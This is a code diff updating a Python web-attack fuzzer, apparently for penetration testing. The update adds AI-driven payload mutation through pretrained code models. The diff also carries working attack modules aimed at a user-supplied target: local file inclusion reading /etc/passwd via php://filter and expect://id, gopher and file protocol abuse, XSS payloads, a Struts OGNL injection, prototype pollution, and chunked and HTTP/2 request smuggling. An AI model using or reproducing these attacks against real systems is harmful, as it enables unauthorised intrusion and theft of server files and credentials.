@@ -4,6 +4,7 @@
                    P H P  •  J S • S U P E R  •  F U Z Z E R
                                  ( v5.5 )
                           Haroon Ahmad Awan
+                            Powered by AI
 ═══════════════════════════════════════════════════════════════════════════
 • Dynamic SPA crawler (Angular / React / Vue / Lit / Next / Svelte / HTMX)
 • Discovers:
@@ -11,6 +12,8 @@
       – XHR / fetch / GraphQL / REST / Web‑socket endpoints
       – Hidden iframes & Shadow‑DOM nodes
       – All HTML forms (GET & POST)  →  auto‑fuzz fields
+• New CLI: --use-ai to enable LLM-driven mutation
+• Improved ai_mutate: uses MaskedLM for context and CausalLM for new variants
 • Fully‑loaded attack arsenal:
       – Multi‑stage param recursion  
       – Protocol‑scheme abuse (gopher/file/data/blob/php://filter)
@@ -48,10 +51,27 @@ from pathlib import Path
 from bs4 import BeautifulSoup
 from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
 
+# ── AI Models ──────────────────────────────────────────────────────────
+USE_AI = False
+AI_ENABLED = False
+try:
+    from transformers import AutoTokenizer, AutoModelForMaskedLM, AutoModelForCausalLM
+    # Masked LM for subtle context-aware alterations
+    MLM_TOKENIZER = AutoTokenizer.from_pretrained("microsoft/codebert-base")
+    MLM_MODEL     = AutoModelForMaskedLM.from_pretrained("microsoft/codebert-base")
+    # Causal LM for generative variants
+    CLM_TOKENIZER = AutoTokenizer.from_pretrained("microsoft/CodeGPT-small-py")
+    CLM_MODEL     = AutoModelForCausalLM.from_pretrained("microsoft/CodeGPT-small-py")
+    MLM_MODEL.eval()
+    CLM_MODEL.eval()
+    AI_ENABLED = True
+except Exception:
+    AI_ENABLED = False
+
 # ── Configuration ──────────────────────────────────────────────────────
 PAGE_TIMEOUT    = 60_000  # ms
 RETRIES         = 1
-LOG_FILE        = Path("super_fuzz2_v5_5.log")
+LOG_FILE        = Path("super_fuzz2_v5_6.log")
 LOG_FILE.write_text("", encoding="utf-8")  # reset
 
 # ── Friendly User‑Agents ───────────────────────────────────────────────
@@ -65,16 +85,16 @@ USER_AGENTS = [
 ]
 
 # ── Globals set by CLI ─────────────────────────────────────────────────
-DEBUG         = False
-THREADS       = 10
-PROXY         = None
-CHROME_PATH   = None
-AUTOHOOK      = False
-CDP_ENDPOINT  = None
-CDP_PORT      = 9222
-chrome_proc   = None
+DEBUG            = False
+THREADS          = 10
+PROXY            = None
+CHROME_PATH      = None
+AUTOHOOK         = False
+CDP_ENDPOINT     = None
+CDP_PORT         = 9222
+chrome_proc      = None
 BROWSER_OVERRIDE = None
-SHOW_REQ_RES  = False  # Enable request/response logging
+SHOW_REQ_RES     = False  # Enable request/response logging
 
 # ── Helpers ─────────────────────────────────────────────────────────────
 def get_random_ua():
@@ -96,14 +116,12 @@ def do_request(method, url, **kwargs):
         log(f"[REQ] {method.upper()} {url} {kwargs}", "REQ")
     r = requests.request(method, url, **kwargs)
     if SHOW_REQ_RES:
-        log(f"[RES] {r.status_code} {r.text}", "RES")
+        log(f"[RES] {r.status_code} {r.text[:200]}", "RES")
     return r
 
 # ── Playwright helper ──────────────────────────────────────────────────
 def open_page(p, url, timeout=PAGE_TIMEOUT, retries=RETRIES):
     global PROXY, CHROME_PATH, CDP_ENDPOINT, BROWSER_OVERRIDE
-
-    # 1) Auto‑hook attach
     if CDP_ENDPOINT:
         if BROWSER_OVERRIDE is None:
             try:
@@ -112,7 +130,6 @@ def open_page(p, url, timeout=PAGE_TIMEOUT, retries=RETRIES):
                 log(f"[!] CDP attach failed – {e}", "!")
                 sys.exit(1)
         browser = BROWSER_OVERRIDE
-    # 2) Launch exactly once
     else:
         if BROWSER_OVERRIDE is None:
             launch_args = [
@@ -130,7 +147,6 @@ def open_page(p, url, timeout=PAGE_TIMEOUT, retries=RETRIES):
             BROWSER_OVERRIDE = p.chromium.launch(**launch_kwargs)
         browser = BROWSER_OVERRIDE
 
-    # 3) New context + page
     for attempt in range(1, retries + 1):
         try:
             ctx = browser.new_context(
@@ -140,7 +156,6 @@ def open_page(p, url, timeout=PAGE_TIMEOUT, retries=RETRIES):
             )
             ctx.set_default_navigation_timeout(timeout)
             page = ctx.new_page()
-
             page.goto(url, wait_until="domcontentloaded", timeout=timeout)
             with contextlib.suppress(PWTimeout):
                 page.wait_for_load_state("networkidle", timeout=10_000)
@@ -154,25 +169,16 @@ def open_page(p, url, timeout=PAGE_TIMEOUT, retries=RETRIES):
                 page.screenshot(path=shot, full_page=True)
                 log(f"[+] Screenshot → {shot}", "+")
             return browser, ctx, page
-
         except Exception as e:
             log(f"Playwright fail ({attempt}/{retries}) – {e}", "!")
             time.sleep(0.5)
 
-    # 4) Static fallback
     log("[~] Falling back to requests()", "·")
     try:
-        sess = requests.Session()
-        sess.trust_env = False
-        r = sess.get(
-            url,
-            timeout=20,
-            verify=False,
-            headers={"User-Agent": get_random_ua()}
-        )
+        sess = requests.Session(); sess.trust_env = False
+        r = sess.get(url, timeout=20, verify=False, headers={"User-Agent": get_random_ua()})
         r.raise_for_status()
         soup = BeautifulSoup(r.text, "html.parser")
-        dummy = type("Dummy", (), {"close": lambda self: None})()
         DummyPage = type("DummyPage", (), {
             "query_selector_all": soup.select,
             "evaluate": lambda self, *_: [],
@@ -180,13 +186,30 @@ def open_page(p, url, timeout=PAGE_TIMEOUT, retries=RETRIES):
             "wait_for_load_state": lambda *a, **k: None,
         })
         log("[+] Static fallback loaded", "+")
-        return dummy, None, DummyPage()
+        return None, None, DummyPage()
     except Exception as e:
         log(f"[!] Static fallback failed – {e}", "!")
         return None, None, None
 
 # ── AI‑style payload mutator ───────────────────────────────────────────
 def ai_mutate(payload):
+    """Generate sophisticated variants using pretrained models if enabled."""
+    if AI_ENABLED and USE_AI:
+        try:
+            # Causal LM generation
+            inputs = CLM_TOKENIZER.encode(payload, return_tensors="pt")
+            outputs = CLM_MODEL.generate(
+                inputs,
+                max_length=min(inputs.shape[-1] + 32, 128),
+                num_return_sequences=1,
+                do_sample=True,
+                top_k=50
+            )
+            variant = CLM_TOKENIZER.decode(outputs[0], skip_special_tokens=True)
+            return variant or payload
+        except Exception:
+            pass
+    # Fallback simple variants
     variants = [
         payload[::-1],
         urllib.parse.quote(payload),
@@ -216,8 +239,7 @@ def fuzz_html_form(action, method, fields):
         if any(k in r.text for k in ("uid=", "root:", "alert(", "<svg")):
             log(f"Form vulnerable → {action}", "✓")
     except Exception as e:
-        if DEBUG:
-            log(f"Form fuzz error {action} – {e}", "!")
+        if DEBUG: log(f"Form fuzz error {action} – {e}", "!")
 
 # ── Server‑side attack modules ─────────────────────────────────────────
 def recursive_param(u):
@@ -230,9 +252,11 @@ def recursive_param(u):
             pass
 
 def protocol_abuse(u):
-    for proto in ["gopher://127.0.0.1:11211/_stats", "file:///etc/passwd",
-                  "blob:http://localhost", "data:text/html,<script>alert(6)</script>",
-                  "php://input", "php://filter/convert.base64-encode/resource=index.php"]:
+    for proto in [
+        "gopher://127.0.0.1:11211/_stats", "file:///etc/passwd",
+        "blob:http://localhost", "data:text/html,<script>alert(6)</script>",
+        "php://input", "php://filter/convert.base64-encode/resource=index.php"
+    ]:
         try:
             r = do_request("get", u + "?p=" + quote(proto), timeout=2, headers={"User-Agent": get_random_ua()})
             if any(x in r.text for x in ("uid=", "root:")):
@@ -251,8 +275,12 @@ def split_eval(u):
 
 def mime_confuse(u):
     try:
-        r = do_request("post", u, data="<script>alert(1)</script>",
-                       headers={"Content-Type": "application/json", "User-Agent": get_random_ua()}, timeout=2)
+        r = do_request(
+            "post", u,
+            data="<script>alert(1)</script>",
+            headers={"Content-Type": "application/json", "User-Agent": get_random_ua()},
+            timeout=2
+        )
         if "<script" in r.text:
             log("MIME confusion ✓", "✓")
     except:
@@ -269,7 +297,8 @@ def unicode_path(u):
 
 def lfi_fuzz(u):
     paths = ["/etc/passwd", "/var/www/html/index.php", "/etc/hosts", "../../../../../../etc/passwd"]
-    for w in ["php://filter/convert.base64-encode/resource=", "expect://id", "input://"]:
+    wrappers = ["php://filter/convert.base64-encode/resource=", "expect://id", "input://"]
+    for w in wrappers:
         for pth in paths:
             url = f"{u}?file={w}{pth}"
             try:
@@ -298,9 +327,11 @@ def yaml_injection(u):
         pass
 
 def ognl_injection(u):
-    pay = "%{(#_='multipart/form-data')." \
-          "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']" \
-          ".addHeader('X',#_))}"
+    pay = (
+        "%{(#_='multipart/form-data')."
+        "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
+        ".addHeader('X',#_))}"
+    )
     try:
         r = do_request("get", f"{u}?name={quote(pay)}", timeout=2, headers={"User-Agent": get_random_ua()})
         if "X" in r.headers:
@@ -320,40 +351,50 @@ def dom_proto_poll(u, p):
     br, _, pg = open_page(p, u)
     if pg:
         pg.on("console", lambda m: "[PP]" in m.text and log("Proto polluted", "✓"))
-        pg.evaluate("let e=JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');"
-                    "Object.assign({},e);console.log(\"[PP]\"+{}.polluted)")
+        pg.evaluate(
+            "let e=JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');"
+            "Object.assign({},e);console.log(\"[PP]\"+{}.polluted)"
+        )
         br.close()
 
 def dom_ws_inject(u, p):
     br, _, pg = open_page(p, u)
     if pg:
         pg.on("console", lambda m: "[WS]" in m.text and log("WS XSS", "✓"))
-        pg.evaluate('const w=new WebSocket("wss://echo.websocket.events");'
-                    'w.onopen=()=>w.send("<svg/onload=alert(2)>");'
-                    'w.onmessage=e=>console.log("[WS]"+e.data);')
+        pg.evaluate(
+            'const w=new WebSocket("wss://echo.websocket.events");'
+            'w.onopen=()=>w.send("<svg/onload=alert(2)>");'
+            'w.onmessage=e=>console.log("[WS]"+e.data);'
+        )
         time.sleep(1)
         br.close()
 
 def dom_async(u, p):
     br, _, pg = open_page(p, u)
     if pg:
-        pg.evaluate("(async()=>{let x=await new Promise(r=>setTimeout(()=>r('alert(7)'),150));eval(x)})();")
+        pg.evaluate(
+            "(async()=>{let x=await new Promise(r=>setTimeout(()=>r('alert(7)'),150));eval(x)})();"
+        )
         log("Async race", "✓")
         br.close()
 
 def dom_iframe(u, p):
     br, _, pg = open_page(p, u)
     if pg:
-        pg.evaluate("let f=document.createElement('iframe');"
-                    "f.srcdoc='<script>alert(99)</script>';document.body.appendChild(f)")
+        pg.evaluate(
+            "let f=document.createElement('iframe');"
+            "f.srcdoc='<script>alert(99)</script>';document.body.appendChild(f)"
+        )
         log("Iframe clone", "✓")
         br.close()
 
 def dom_mutation(u, p):
     br, _, pg = open_page(p, u)
     if pg:
-        pg.evaluate("new MutationObserver(()=>alert('M')).observe(document.body,{childList:true,subtree:true});"
-                    "document.body.appendChild(document.createElement('div'));")
+        pg.evaluate(
+            "new MutationObserver(()=>alert('M')).observe(document.body,{childList:true,subtree:true});"
+            "document.body.appendChild(document.createElement('div'));"
+        )
         log("MutationObs", "✓")
         br.close()
 
@@ -388,8 +429,10 @@ def crlf_smuggle(host):
         if DEBUG: log(f"CRLF smuggle error – {e}", "!")
 
 def chunk_desync(host):
-    raw = (f"POST / HTTP/1.1\r\nHost:{host}\r\n"
-           "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n")
+    raw = (
+        f"POST / HTTP/1.1\r\nHost:{host}\r\n"
+        "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
+    )
     try:
         s = socket.create_connection((host, 80), timeout=4)
         s.send(raw.encode())
@@ -402,8 +445,11 @@ def http2_smuggle(host):
     try:
         conn = http.client.HTTPConnection(host, 80, timeout=4)
         conn._http_vsn = 32; conn._http_vsn_str = "HTTP/2.0"
-        conn.putrequest("SMUGGLE", "/"); conn.putheader("Host", host)
-        conn.endheaders(); conn.send(b"0\r\n\r\n"); conn.close()
+        conn.putrequest("SMUGGLE", "/")
+        conn.putheader("Host", host)
+        conn.endheaders()
+        conn.send(b"0\r\n\r\n")
+        conn.close()
         log("HTTP2 smuggle sent", "+")
     except Exception as e:
         if DEBUG: log(f"HTTP2 smuggle error – {e}", "!")
@@ -452,9 +498,11 @@ def smart_crawl(seed, p):
 
 # ── Threaded server‑side fuzz ─────────────────────────────────────────
 def run_server(u):
-    mods = [recursive_param, protocol_abuse, split_eval,
-            mime_confuse, unicode_path, lfi_fuzz,
-            ssrf_fuzz, yaml_injection, ognl_injection]
+    mods = [
+        recursive_param, protocol_abuse, split_eval,
+        mime_confuse, unicode_path, lfi_fuzz,
+        ssrf_fuzz, yaml_injection, ognl_injection
+    ]
     for fn in mods:
         log(f"· Running {fn.__name__} against {u}", "·")
         try:
@@ -465,7 +513,7 @@ def run_server(u):
 
 # ── Main ───────────────────────────────────────────────────────────────
 def main():
-    global DEBUG, THREADS, PROXY, CHROME_PATH, AUTOHOOK, CDP_ENDPOINT, chrome_proc, SHOW_REQ_RES
+    global DEBUG, THREADS, PROXY, CHROME_PATH, AUTOHOOK, CDP_ENDPOINT, chrome_proc, SHOW_REQ_RES, USE_AI
     parser = argparse.ArgumentParser()
     parser.add_argument("url", help="Target URL")
     parser.add_argument("-U", "--threads", type=int, default=10, help="Server‑side threads")
@@ -474,6 +522,7 @@ def main():
     parser.add_argument("--chrome", help="Path to Chrome executable")
     parser.add_argument("--autohook", action="store_true", help="Auto‑hook into Chrome via remote debug")
     parser.add_argument("--show-req-res", action="store_true", help="Enable request/response logging")
+    parser.add_argument("--use-ai", action="store_true", help="Enable AI‑powered payload generation")
     args = parser.parse_args()
 
     DEBUG        = args.debug
@@ -482,7 +531,11 @@ def main():
     CHROME_PATH  = args.chrome
     AUTOHOOK     = args.autohook
     SHOW_REQ_RES = args.show_req_res
+    USE_AI       = args.use_ai and AI_ENABLED
+    if args.use_ai and not AI_ENABLED:
+        log("[!] AI models not available, falling back to simple mutation", "!")
 
+    # Auto‑hook Chrome setup
     if AUTOHOOK:
         candidates = [CHROME_PATH] if CHROME_PATH else []
         candidates += [
@@ -530,15 +583,17 @@ def main():
     http2_smuggle(host)
 
     with sync_playwright() as p:
-        for mod in (dom_clipboard, dom_proto_poll, dom_ws_inject,
-                    dom_async, dom_iframe, dom_mutation, websocket_fuzz):
+        for mod in (
+            dom_clipboard, dom_proto_poll, dom_ws_inject,
+            dom_async, dom_iframe, dom_mutation, websocket_fuzz
+        ):
             try:
                 mod(args.url, p)
             except Exception as e:
                 if DEBUG:
                     log(f"{mod.__name__} error – {e}", "!")
 
-    log("✅ FUZZER COMPLETE", "✓")
+    log("✅ AI‑ENHANCED FUZZER COMPLETE", "✓")
 
 if __name__ == "__main__":
     try:
